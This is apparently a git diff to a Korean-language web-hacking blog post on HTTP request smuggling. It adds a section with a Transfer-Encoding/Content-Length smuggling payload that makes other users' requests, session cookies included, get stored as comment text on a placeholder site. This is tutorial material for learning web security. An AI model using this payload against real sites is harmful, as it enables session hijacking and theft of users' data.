@@ -3,7 +3,7 @@ layout: post
 title:  "HTTP Request Smuggling Attack "
 date:   2020-11-07
 categories: ["2020","web hacking"]
-update: 2020-11-07
+update: 2020-11-08
 tags: [web]
 ---
 
@@ -634,6 +634,45 @@ print (data.decode())
 ```
 
 `search` 파라미터의 값이 응답에 그대로 표시되기 때문에, `search` 로 Front-end가 추가한 헤더를 알아내고, 이 헤더의 값을 `127.0.0.1`로 바꾸면 됩니다.
+
+### 😎 Capuring other users' requests
+
+어플리케이션이 텍스트로 된 데이터를 저장하고 다운로드할 수 있는 기능을 지원하는 경우, **HTTP request smuggling** 공겨을 사용해서 다른 사용자들의 요청의 내용을 가져올 수 있습니다. session 토큰을 포함할 수도 있고, session 하이재킹 공격을 가능하게 할 수 있고, 또 다른 사용자로가 사용한 민감한 정보를 포함할 수도 있습니다. 댓글, 이메일, 프로필 설명 같은 기능들이 주로 이 공격을 수행하는데 자주 사용됩니다.
+
+이 공격을 수행하려면 데이터 저장 기능에 보내는 요청을 smuggle 할 수 있어야 합니다. Back-end가 정상적으로 처리해야 하는 다음 요청이 smuggle된 요청 뒤에 붙어서, 다른 사용자의 요청 내용이 raw text로 저장됩니다.
+
+블로그에 댓글을 다는 요청을 예로 들어 봅시다. 이 요청의 결과는 블로그에 나타납니다 :
+
+``` http  
+POST /post/comment HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 154
+Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO
+
+csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&comment=My+comment&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net
+```
+
+다음과 같은 요청을 보내서 **HTTP request smuggling** 공격을 수행할 수 있습니다 :
+
+``` http
+GET / HTTP/1.1
+Host: vulnerable-website.com
+Transfer-Encoding: chunked
+Content-Length: 324
+
+0
+
+POST /post/comment HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 400
+Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO
+
+csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net&comment=
+```
+
+다른 사용자의 요청이 Back-end 서버에 의해 처리될 때, 그 요청은 smuggle된 요청에 붙게 되고 다른 사용자의 요청이 text로 저장됩니다.
 
 ### UPDATING.. 
 
